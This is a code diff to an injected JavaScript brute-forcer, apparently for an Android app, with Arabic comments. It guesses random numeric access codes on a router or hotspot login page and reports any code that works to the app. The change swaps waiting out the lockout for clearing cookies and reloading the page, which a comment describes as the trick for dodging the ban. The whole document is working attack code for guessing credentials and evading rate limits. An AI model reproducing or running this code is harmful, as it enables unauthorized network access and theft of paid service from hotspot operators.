@@ -10,16 +10,21 @@
 
     async function run() {
         log('▶ بدء');
-        const input = document.querySelector('input[name="username"]');
-        const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
         
-        if (!input) { log('❌ لا يوجد حقل إدخال'); window.__cracking = false; return; }
-
         const maxVal = Math.pow(10, CFG.digits) - 1;
         let done = 0;
 
         for (let i = 0; i < CFG.attempts; i++) {
             if (stopped) { log('⏹ توقف'); break; }
+
+            const input = document.querySelector('input[name="username"]');
+            const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
+            
+            if (!input) {
+                // إذا لم يجد حقل الإدخال، انتظر قليلاً
+                await new Promise(r => setTimeout(r, 1000));
+                continue; 
+            }
 
             const num = Math.floor(Math.random() * (maxVal + 1));
             const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;
@@ -34,37 +39,26 @@
 
             if (btn) { try { btn.click(); } catch(e) {} }
 
-            // انتظار استجابة الراوتر
             await new Promise(r => setTimeout(r, 1500));
 
             const pageText = document.body.innerText;
 
-            // 1. فحص الحظر (استخراج الوقت وانتظاره)
+            // 🚀 السر هنا: عند الحظر، نمسح الجلسة (الكوكيز) ونعيد تحميل الصفحة (جلسة جديدة)
             if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد المسموح")) {
-                const match = pageText.match(/(\d+)\s*(?:دقائق|دقيقة|دقائق و)\s*(?:و)?\s*(\d+)?\s*(?:ثانية|ثواني)?/);
-                let waitSec = 60; // افتراضي دقيقة
-                if (match) {
-                    const mins = parseInt(match[1]) || 0;
-                    const secs = parseInt(match[2]) || 0;
-                    waitSec = (mins * 60) + secs;
-                }
-                log('🛑 حظر! انتظار ' + waitSec + ' ثانية ثم إعادة المحاولة...');
-                await new Promise(r => setTimeout(r, waitSec * 1000));
-                
-                if (stopped) break;
-                location.href = "index.html"; // إعادة تحميل الصفحة
+                log('🛑 حظر! مسح الجلسة وتجديد المتصفح...');
+                try { window["AndroidBridge" + id].clearCookies(); } catch(e) {}
+                setTimeout(() => { window.location.reload(); }, 500);
                 return;
             }
 
-            // 2. فحص النجاح الحقيقي
+            // فحص النجاح
             if (window.location.href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي")) {
-                log('✅✅✅ نجاح حقيقي: ' + v);
+                log('✅✅✅ نجاح: ' + v);
                 try { window["AndroidBridge" + id].found(v, pageText); } catch(e) {}
                 window.__cracking = false;
                 return;
             }
 
-            // 3. عرض رسالة الخطأ الحقيقية (غير موجود / منتهي)
             const errDiv = document.getElementById('error');
             if (errDiv && errDiv.innerText.trim() !== "") {
                 log('📄 ' + errDiv.innerText.trim());
